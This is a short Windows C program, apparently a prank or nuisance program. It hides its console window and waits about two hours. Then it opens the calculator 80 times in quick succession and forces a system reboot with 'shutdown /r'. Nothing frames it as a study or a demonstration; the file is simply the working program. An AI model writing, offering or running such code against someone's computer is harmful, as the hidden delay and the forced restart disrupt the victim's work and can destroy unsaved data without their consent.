#include <windows.h>
#include <stdio.h>
#pragma comment(lib, "Ws2_32.lib")

void oioi(){
    Sleep(7320000);
    int i = 0;
    while(i < 12){
        Sleep(1000);
        STARTUPINFO si;
        PROCESS_INFORMATION pi;
        ZeroMemory( &si, sizeof(si) );
        si.cb = sizeof(si);
        ZeroMemory( &pi, sizeof(pi) );
        char ay[] = "calc.exe";
        if( !CreateProcess(NULL, ay, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
        WaitForSingleObject( pi.hProcess, INFINITE );
        CloseHandle( pi.hProcess );
        CloseHandle( pi.hThread );
        i++;
    }
    while(i < 80){
        Sleep(500);
        STARTUPINFO si;
        PROCESS_INFORMATION pi;
        ZeroMemory( &si, sizeof(si) );
        si.cb = sizeof(si);
        ZeroMemory( &pi, sizeof(pi) );
        char ayy[] = "calc.exe";
        if( !CreateProcess(NULL, ayy, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
        WaitForSingleObject( pi.hProcess, INFINITE );
        CloseHandle( pi.hProcess );
        CloseHandle( pi.hThread );
        i++;
    }
    Sleep(30000);
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
    ZeroMemory( &pi, sizeof(pi) );
    char shutdown[] = "shutdown /r";
    if( !CreateProcess(NULL, shutdown, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
    WaitForSingleObject( pi.hProcess, INFINITE );
    CloseHandle( pi.hProcess );
    CloseHandle( pi.hThread );
    exit(0);
}

int main (){
    FreeConsole();
    oioi();
    return 0;
}